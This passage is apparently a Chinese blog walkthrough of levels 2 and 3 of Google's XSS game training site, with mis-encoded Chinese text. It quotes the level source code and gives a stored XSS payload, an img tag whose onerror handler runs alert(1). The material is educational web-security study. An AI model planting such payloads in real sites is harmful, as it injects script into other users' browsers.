tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level2.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Chatter from across the Web.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clear-form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clear<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Clear all posts<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">valign</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/level2_icon.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>shim<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-content<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span>              <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>share<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Share status!<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>action<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sign<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Post-store.js</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">/* * Objects to implement a client-side post database. */</span> <span class="token keyword">function</span> <span class="token function">Post</span><span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>message <span class="token operator">=</span> message<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function">PostDB</span><span class="token punctuation">(</span><span class="token parameter">defaultMessage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Initial message to display to users</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>_defaultMessage <span class="token operator">=</span> defaultMessage <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">setup</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> defaultPost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Post</span><span class="token punctuation">(</span>defaultMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token string">"posts"</span> <span class="token operator">:</span> <span class="token punctuation">[</span>defaultPost<span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">save</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">message<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> newPost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Post</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> allPosts <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    allPosts<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPost<span class="token punctuation">)</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token string">"posts"</span> <span class="token operator">:</span> allPosts    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">clear</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">getPosts</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>posts<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>å…³é”®ä»£ç </p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>posts<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">'&lt;table class="message"> &lt;tr> &lt;td valign=top> '</span>            <span class="token operator">+</span> <span class="token string">'&lt;img src="/static/level2_icon.png"> &lt;/td> &lt;td valign=top '</span>            <span class="token operator">+</span> <span class="token string">' class="message-container"> &lt;div class="shim">&lt;/div>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;b>You&lt;/b>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;span class="date">'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>date<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/span>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;blockquote>"</span> <span class="token operator">+</span> posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>message <span class="token operator">+</span> <span class="token string">"&lt;/blockquote"</span><span class="token punctuation">;</span> <span class="token comment">//è¿™è¿˜å°‘ä¸ª '>' 23333</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;/td>&lt;/tr>&lt;/table>"</span>          containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">+=</span> html<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span></code></pre><p>å¯ä»¥å‘ç°æˆ‘ä»¬æäº¤çš„å†…å®¹è¾“å‡ºå­—æ®µä¼šè¢«<code>&lt;blockquote&gt;</code>åŒ…è£¹ï¼Œè€ƒè™‘åˆ°æ•°æ®æ˜¯å­˜å‚¨çš„æœåŠ¡å™¨ä¸Šçš„å¯ä»¥åˆ©ç”¨å­˜å‚¨å‹xssï¼Œåˆ©ç”¨<code>onerror</code>äº‹ä»¶æ¥è¿›è¡Œxss</p><blockquote><p>onerror äº‹ä»¶åœ¨è§†é¢‘/éŸ³é¢‘ï¼ˆaudio/videoï¼‰æ•°æ®åŠ è½½æœŸé—´å‘ç”Ÿé”™è¯¯æ—¶è§¦å‘ã€‚</p></blockquote><p>åˆ©ç”¨imgæ ‡ç­¾åŠ è½½ä¸€ä¸ªä¸å­˜åœ¨çš„å¯¹è±¡ï¼Œä¼šè§¦å‘onerroräº‹ä»¶</p><p>payloadï¼š</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">""</span> onerror<span class="token operator">=</span><span class="token string">"javascript:alert(1);"</span><span class="token operator">/</span><span class="token operator">></span></code></pre><p>ä»£ç å­˜è¿›äº†æœåŠ¡å™¨é‡Œï¼Œåªè¦åˆ·æ–°éƒ½ä¼šè§¦å‘</p><img src="/article/xss/image-20210424145306208.png" class="" title="level2-1" loading="lazy"><img src="/article/xss/image-20210424145406792.png" class="" title="level2-2" loading="lazy"><hr><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><a href="https://xss-game.appspot.com/level3/frame#1">https://xss-game.appspot.com/level3/frame#1</a></p><p>æºç Â·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token comment">&lt;!-- Load jQuery --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span>      <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">function</span> <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token parameter">num</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Dynamically load the appropriate image.</span>        <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">"Image "</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        html <span class="token operator">+=</span> <span class="token string">"&lt;img src='/static/level3/cloud"</span> <span class="token operator">+</span> num <span class="token operator">+</span> <span class="token string">".jpg' />"</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#tabContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>         window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> num<span class="token punctuation">;</span>         <span class="token comment">// Select the current tab</span>        <span class="token keyword">var</span> tabs <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'.tab'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> tabs<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>id <span class="token operator">==</span> <span class="token string">"tab"</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">"tab active"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">"tab"</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>         <span class="token comment">// Tell parent we've changed the tab</span>        top<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token comment">// Extra code so that we can communicate with the parent page</span>      window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>source <span class="token operator">==</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level3.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Take a tour of our cloud data center.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab1<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>chooseTab(<span class="token punctuation">'</span>1<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Image 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab2<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>chooseTab(<span class="token punctuation">'</span>2<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Image 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab3<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>chooseTab(<span class="token punctuation">'</span>3<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Image 3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tabContent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>å…³é”®ä»£ç 